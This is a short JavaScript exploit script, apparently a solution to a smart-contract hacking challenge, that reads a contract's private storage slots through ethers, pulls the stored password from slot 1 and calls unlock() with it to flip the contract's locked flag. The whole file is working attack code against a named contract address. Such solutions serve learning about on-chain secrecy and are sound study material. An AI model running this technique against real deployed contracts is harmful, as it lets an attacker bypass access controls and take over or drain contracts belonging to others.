const { ethers } = require('ethers');

let ABI = require('./ABI.json');
let PRIVATE_KEY = ""
let network = ""
let Contract_address = "0x087061667c15f0aa40AA5e5442DaF69011c239dD";


let provider = new ethers.providers.JsonRpcProvider(network);                        // read from blockchain
let signer = new ethers.Wallet(PRIVATE_KEY, provider);                              //  write on blockchain
let i = new ethers.Contract(Contract_address,ABI,signer);                          // contract_instance

let main = async()=>
{
    let Print_1st_3_slots = async()=>
    {
        for (let slot = 0; slot < 3; slot++)
        {
            console.log(`[${slot}]` + 
            await provider.getStorageAt(Contract_address, slot));
        }
    }


    await Print_1st_3_slots();   // locked = true

    let password_ = await provider.getStorageAt(Contract_address, 1);
    console.log("password =" ,password_);
    let tx = await i.unlock(password_, {gasLimit: 5000000  });
    await tx.wait();
    await Print_1st_3_slots();   // locked = false
    
}
main().catch((error) => 
{
    console.log("Error aagya ===")
    console.error(error);
});

//Error
//TypeError: Cannot read properties of undefined (reading 'JsonRpcProvider')  -> use ethers@5.